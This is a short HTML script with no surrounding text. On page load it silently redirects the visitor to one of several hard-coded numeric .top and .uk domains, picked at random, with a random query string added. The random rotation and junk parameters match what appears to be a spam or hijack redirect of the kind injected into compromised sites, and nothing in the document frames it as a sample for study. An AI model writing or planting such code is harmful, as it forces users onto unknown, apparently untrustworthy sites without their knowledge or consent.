<script>
var urls=[
'https://www.hswu.top?{nnnnnnnn}{www}',
'https://www.1606.top?{nnnnnnnn}{www}',
'https://www.9151.top?{nnnnnnnn}{www}',
'https://www.4121.top?{nnnnnnnn}{www}',
'https://www.rkdh.uk?{nnnnnnnn}{www}',
'https://www.9091.top?{nnnnnnnn}{www}',
'https://www.9190.top?{nnnnnnnn}{www}',
];
location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
</script>
